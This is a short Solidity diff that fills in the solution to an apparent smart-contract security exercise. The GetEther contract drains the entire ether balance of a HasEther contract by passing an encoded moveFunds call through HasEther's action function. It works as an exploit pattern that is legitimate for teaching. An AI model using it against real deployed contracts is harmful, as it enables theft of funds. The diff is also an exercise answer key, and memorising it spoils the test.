@@ -8,8 +8,16 @@ contract GetEther {
     // get the Ether from the HasEther contract. You may not modify the test
     
     function getEther(HasEther hasEther) external {
-        //...
+        bytes memory data = abi.encodeWithSignature("moveFunds(address)", address(this));
+        hasEther.action(address(this), data);
     }
+
+    function moveFunds(address receiver) external payable {
+      (bool success, ) = payable(receiver).call{ value: address(this).balance }("");
+      require(success, "moving funds failed");
+    }
+
+    receive() external payable {}
 }
 
 contract HasEther {
